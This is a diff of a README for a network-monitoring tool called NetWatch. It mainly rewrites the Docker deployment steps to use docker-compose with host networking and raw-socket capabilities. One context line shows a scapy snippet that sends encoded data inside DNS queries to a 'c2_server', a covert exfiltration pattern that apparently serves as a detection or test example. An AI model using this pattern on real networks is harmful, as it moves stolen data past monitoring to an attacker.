@@ -223,26 +223,21 @@ brew install tcpdump wireshark
      data_packet = IP(dst=c2_server)/DNS(qd=DNSQR(qname=encoded_data))
      ```
 
-## 🐳 Docker Deployment
+### 🚢 Docker Deployment
 
-### Building the Container
-
-```bash
-# Build the Docker image
-docker build -t netwatch .
-```
+1. Ensure you have Docker and Docker Compose installed.
+2. Build and start the container:
 
 ```bash
-# Run the container
-docker run -d \
-  --name netwatch \
-  --network host \
-  --cap-add=NET_ADMIN \
-  --cap-add=NET_RAW \
-  netwatch
+# From the project root
+docker-compose up --build -d
 ```
 
-## 🍓 Raspberry Pi Deployment
+3. Open your browser to http://localhost:8502 to access NetWatch in the container.
+
+> The included `docker-compose.yml` uses `network_mode: host` and grants `NET_RAW` and `NET_ADMIN` capabilities, so ARP scanning and raw sockets work without sudo on the host.
+
+## 🐳 Raspberry Pi Deployment
 
 ### Setting up Raspberry Pi
 
